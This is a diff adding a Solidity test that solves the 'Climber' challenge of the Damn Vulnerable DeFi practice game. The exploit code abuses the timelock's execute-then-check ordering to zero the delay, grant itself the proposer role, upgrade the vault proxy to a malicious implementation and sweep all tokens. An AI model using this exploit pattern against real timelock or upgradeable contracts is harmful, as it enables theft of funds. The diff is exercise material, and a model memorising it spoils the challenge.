@@ -7,6 +7,9 @@ import {ClimberVault} from "../../src/climber/ClimberVault.sol";
 import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {UpgradedVault} from "./UpgradedVault.sol";
+import {Attacker} from "./Attacker.sol";
+import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
 
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -85,7 +88,31 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
+        UpgradedVault upgradedVault = new UpgradedVault();
+        bytes memory data = abi.encodeCall(UpgradedVault.changeSweeper, (player));
+        address[] memory targets = new address[](4);
+        uint256[] memory values = new uint256[](4);
+        bytes[] memory dataElements = new bytes[](4);
+        bytes32 salt = 0x00;
+        Attacker attacker = new Attacker(timelock, vault, upgradedVault, player);
         
+        targets[0] = address(timelock);
+        targets[1] = address(timelock);
+        targets[2] = address(vault);
+        targets[3] = address(attacker);
+
+        dataElements[0] = abi.encodeCall(timelock.updateDelay, 0);
+        dataElements[1] = abi.encodeCall(timelock.grantRole, (PROPOSER_ROLE, address(attacker)));
+        dataElements[2] = abi.encodeCall(UUPSUpgradeable.upgradeToAndCall, (address(upgradedVault), data));
+        dataElements[3] = abi.encodeCall(Attacker.attack, ());
+
+        values[0] = 0;
+        values[1] = 0;
+        values[2] = 0;
+        values[3] = 0;
+        timelock.execute(targets, values, dataElements, salt);
+        vault.sweepFunds(address(token));
+        token.transfer(recovery, token.balanceOf(player));
     }
 
     /**
